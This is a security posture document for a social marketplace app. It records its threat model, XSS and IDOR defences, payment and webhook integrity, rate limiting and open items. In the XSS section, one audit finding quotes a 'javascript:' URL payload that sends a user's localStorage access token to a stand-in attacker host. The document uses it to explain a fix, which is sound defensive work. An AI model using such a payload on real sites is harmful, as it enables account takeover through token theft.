# MarketX Security Posture

**Last reviewed:** June 2026
**Scope:** Application-layer security for the Commerce (P0/P1) surface, plus
cross-cutting auth/session/transport concerns. Infrastructure hardening
(secrets rotation, WAF, network) is tracked separately in `AUDIT.md` →
Pre-Production Checklist.

This document records what is **defended and verified**, what is **known and
accepted**, and what is **still open**. It is evidence-based — every "verified"
claim maps to a test or a code reference.

---

## Threat model summary

MarketX is a social marketplace: untrusted users create content (products,
posts, comments, reviews, store profiles, chat) that other users view, and
real money moves through carts, payments, wallets, and payouts. The dominant
risks, ranked for this app:

| Rank | Threat | Why it matters here | Status |
|------|--------|---------------------|--------|
| 1 | **Stored XSS → auth-token theft** | Access token lives in `localStorage`; any script on-origin can exfiltrate it | Audited; known sinks safe (June 2026) |
| 2 | **IDOR / broken authorization** | Buyers/sellers must not touch each other's orders, wallets, products | Verified |
| 3 | **Payment & money manipulation** | Price tampering, replay, double-spend, oversell | Verified |
| 4 | **Webhook forgery** | Forged delivery/payment events can release funds or flip order state | Verified (fail-closed) |
| 5 | **Auth attacks** (reset/verify/OAuth) | Account takeover → everything downstream | Partial (July scope) |
| 6 | **DoS / scraping** | Catalog scraping, brute-force | Partial |

---

## 1. Cross-Site Scripting (XSS)

### Token-theft exposure
The access token is stored in `localStorage` and sent via the `Authorization:
Bearer` header (`layers/core/app/services/base.api.ts`). This makes the app
**immune to CSRF on authenticated requests** (browsers don't auto-attach the
header cross-site) but means **any stored-XSS bug is a full account-takeover
vector**. XSS is therefore the #1 priority.

### Render sinks — all four `v-html` usages audited safe
| Component | Source | Defense |
|-----------|--------|---------|
| `commerce/.../product/[slug].vue` | product description | DOMPurify (client-only; raw on SSR to avoid hydration mismatch) |
| `commerce/.../modals/ProductDetailModal.vue` | product description | DOMPurify |
| `social/.../PostCaption.vue` | caption + @mentions + #hashtags | HTML-escape first, then inject links only from regex matches constrained to `[a-zA-Z0-9_-]` with `encodeURIComponent` |
| `ai/.../dassa/Markdown.vue` | AI response | HTML-escape first, then markdown transforms wrap already-escaped content |

All other user content (comments, reviews, chat messages, store names, bios) is
rendered through Vue mustache `{{ }}`, which **auto-escapes** — safe by default.

### Attribute-injection (`:href`) — vulnerability found & fixed
**Finding (June 2026):** Zod's `.url()` accepts `javascript:` and `data:`
schemes (it only checks the string parses as a URL). `store_website` and
profile `links[].url` used `.url()`, so a seller/user could persist
`javascript:fetch('//evil/'+localStorage.accessToken)` and steal the token of
anyone who clicked their "Visit website" link.

**Fix:**
- **Input validation** — `shared/utils/safeUrl.ts` `safeHttpUrl()` enforces an
  http(s)-only allowlist; wired into `seller.schema.ts` (create + update) and
  `profile.schema.ts` (`links[].url`).
- **Render-time guard (defense-in-depth)** — `safeExternalUrl()` applied to
  every user-sourced `:href` binding (seller profile ×3, ProfileHeader,
  AboutTab). Neutralizes any row persisted before the validation was tightened.
- **Tests** — `shared/utils/__tests__/safeUrl.spec.ts` (9 tests: every script
  payload rejected at both layers, legit http(s) preserved). Seller/profile API
  suites still green (legit URLs pass).

### Residual XSS items (recommended before scale)
- Move the auth token to an **httpOnly cookie** — would make stored XSS unable
  to read it, de-fanging the entire class. Larger change; highest-leverage.
- **File-upload content-type validation** server-side is unverified — an
  unvalidated SVG/HTML served from-origin is an XSS delivery path.

---

## 2. Authorization (IDOR)

Ownership is enforced **server-side**, not in the UI. Verified with real
two-account (cross-seller / cross-buyer) tests, not fake IDs:

- **Orders** — `GET/POST /orders/:id*` assert `order.userId === user.id`;
  seller order routes assert `seller.profileId === user.id`. Cross-party →
  403. (`orders-extended.spec.ts`)
- **Products** — edit/delete check ownership via `seller.profileId`; second
  seller → 403, buyer (no seller profile) → 403.
  (`products-inventory.spec.ts`)
- **Wallets** — store wallet scoped to `profileId`, returns 404 (no existence
  leak) for non-owners, verified with the second seller's real slug.
  (`wallet-extended.spec.ts`)
- **Bank accounts** — reject accounts belonging to another seller → 403.
- **Draft products** — public list locked to PUBLISHED; non-PUBLISHED only for
  an authenticated seller, force-scoped to their own `sellerId` (closed a
  draft-leak where `?status=DRAFT` exposed everyone's drafts).
- **Status PATCH** — seller-only; buyers → 403.

---

## 3. Payments & money integrity

- **Price tampering** — order placement recomputes line totals server-side from
  the variant/product price; client-sent prices are never trusted
  (`order.service.placeOrder`).
- **Replay / double-credit** — payment verify uses an atomic `updateMany` gated
  on `paymentStatus NOT IN (PAID, FAILED)`; idempotency guard on seller
  crediting. (`payments.spec.ts`)
- **Oversell race** — stock decremented via atomic conditional
  `updateMany({ where: { stock: { gte: qty } }, decrement })` inside a
  transaction; concurrent loser → 400.
- **Double-withdraw race** — wallet withdraw uses the same atomic conditional
  pattern (`balance: { gte: amount }`) with payout + ledger row in one
  `$transaction`; second concurrent request → 400. Also rejects zero-net
  withdrawals (fees ≥ amount).
- **POD fees** — platform fee debited only after Paystack init succeeds (no
  stuck debit on API failure); refunded atomically on refused delivery.
- **Affiliate** — commission scales by quantity, isolated per seller,
  self-referral blocked, credited net of cut.

---

## 4. Webhooks

Both shipping webhooks (`shippo`, `sendbox`) and the Paystack payment webhook:
- **Verify HMAC signature** before processing.
- **Fail closed** — a missing secret rejects the request in production (was
  previously fail-*open*: `if (!secret) return true` skipped verification in
  any environment; fixed June 2026). Dev-only bypass via `import.meta.dev`.
- **Reject malformed JSON** with 400 (was an unhandled 500).
- **Never downgrade terminal order states** — a late SHIPPED/IN_TRANSIT event
  cannot pull a DELIVERED/CANCELLED/RETURNED order backward.

> **Action required before production:** set a real `SENDBOX_WEBHOOK_SECRET`.
> It is currently a placeholder comment in `.env`; because webhooks now fail
> closed, Sendbox tracking updates will be **rejected** until a real value is
> set.

---

## 5. Rate limiting & DoS

`server/middleware/rate-limit.ts` — Redis-backed in production, in-memory
fallback in dev:
- Uploads: 10/min/IP · Authenticated: 300/min/user · Public reads: 120/min/IP
- Auth endpoints use a separate dedicated limiter (`server/utils/auth/rateLimiter.ts`).
- Payment webhooks correctly exempt (providers retry; must not be throttled).

**Known limitations (accepted for launch, revisit at scale):**
- In-memory fallback is **per-instance** — on a multi-instance deploy, limits
  multiply by instance count. Confirm Redis is mandatory (not optional) in prod.
- Public-read limit is per-IP — catalog **scraping** via rotating IPs is
  feasible. Acceptable for a public marketplace; monitor.

---

## 6. CSRF

The Bearer-token-in-header model means authenticated state-changing requests
are **not CSRF-reachable** (the browser won't attach the `Authorization` header
to a cross-site request). A `csrf.ts` util exists but is intentionally **not
wired** — it would be redundant for header auth.

> **One thing to confirm:** the refresh-token cookie path. If session refresh
> relies solely on a cookie, that endpoint *is* CSRF-reachable — verify it
> pairs the cookie with a header/body token or strict `sameSite`.

---

## 7. Transport, secrets, injection

- **SQL injection** — all DB access via Prisma; no raw queries interpolate user
  input. (One raw SQL exists for the pgvector embedding column — schema-level,
  no user input.)
- **Secrets** — read via `useRuntimeConfig()` / env, never hard-coded; not
  echoed into logs (tracing logs `requestId`, not tokens).
- **Cookies** — CSRF/session cookies set `secure` in production,
  `sameSite: 'strict'`, `httpOnly` where the value isn't read by JS.
- **Structured logging** — all catch blocks use `logger.logError` with
  `requestId`; H3 errors pass through (a `requireAuth()` 401 is not swallowed
  into a 500).

---

## Open items before a security sign-off

| # | Item | Severity | Owner action |
|---|------|----------|--------------|
| 1 | Auth token in `localStorage` (XSS-readable) | Medium | Consider httpOnly-cookie migration |
| 2 | File-upload server-side type/size validation unverified | Medium | Verify or add |
| 3 | Refresh-token cookie CSRF-reachability | Medium | Confirm header/sameSite pairing |
| 4 | Password reset / email verify / OAuth `state` untested | Medium | July (Social pillar) |
| 5 | `SENDBOX_WEBHOOK_SECRET` placeholder | High (breaks tracking) | Set real value in prod env |
| 6 | Rate-limit Redis mandatory in prod | Low | Infra config |

---

## Verified-defended checklist (evidence in `AUDIT.md` trackers)

- [x] IDOR across orders, products, wallets, bank accounts
- [x] Server-side price authority (no client price trust)
- [x] Payment replay / double-credit prevention
- [x] Stock oversell race (atomic conditional decrement)
- [x] Wallet double-withdraw race (atomic conditional decrement)
- [x] Webhook HMAC verification, fail-closed
- [x] Webhook terminal-state immutability
- [x] `v-html` sinks sanitized (DOMPurify / escape-first)
- [x] `:href` script-scheme injection blocked (input + render guard)
- [x] SQL injection (Prisma-only)
- [x] Rate limiting on auth, uploads, reads
- [x] No secrets in logs; structured error logging with requestId
